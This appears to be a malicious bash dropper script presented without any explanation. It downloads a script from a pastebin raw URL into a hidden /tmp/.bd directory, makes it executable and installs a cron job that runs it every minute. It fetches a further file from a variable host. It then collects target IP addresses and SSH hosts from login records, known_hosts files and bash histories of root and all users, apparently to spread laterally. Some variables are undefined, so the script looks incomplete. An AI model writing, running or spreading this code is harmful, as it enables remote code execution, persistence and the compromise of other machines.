#!/bin/bash

urlprefix='https://pastebin.com/raw'

if [[ $(ps -ef | grep 'bd' | grep -v grep | wc -l) != 0 ]]; then
    kill 
fi
[ ! -f /tmp/.bd/crontab ] && mkdir /tmp/.bd
curl -s -o /tmp/.bd/bd.sh $urlprefix/fcUFJKm0
chmod +x /tmp/.bd/bd.sh
[ ! -f /tmp/.bd/crontab ] && echo '* * * * * /bin/bash /tmp/.bd/bd.sh > /dev/null 2>&1' >> /tmp/.bd/crontab
crontab /tmp/.bd/crontab
[ ! -f /tmp/.bd/$xr ] && curl -s -o /tmp/.bd/$xr $sshtml/$xr
chmod +x /tmp/.bd/$xr

last -a|awk '{print $10}'|sort -u|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .h
cat /root/.ssh/known_hosts|grep -v ,|awk '{print $1}' >> .h
cat /root/.ssh/known_hosts|grep ,|awk -F, '{print $1}' >> .h
cat /root/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /home/*/.ssh/known_hosts|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /home/*/.bash_history|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|sort -u >> .h
cat /home/*/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v / |sort -u >> .h
cat /home/*/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v / |sort -u >> .h
cat /root/.bash_history |grep ssh|awk '{print $2}'|grep -v '-'|grep -v /|sort -u >> .h
cat /root/.bash_history |grep ssh|awk '{print $3}'|grep -v '-'|grep -v /|sort -u >> .h
cat .h|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' > .hh
cat .h|grep -v 127.0.0.1|grep -v localhost|sort -u >> .hh
cat .hh > .h
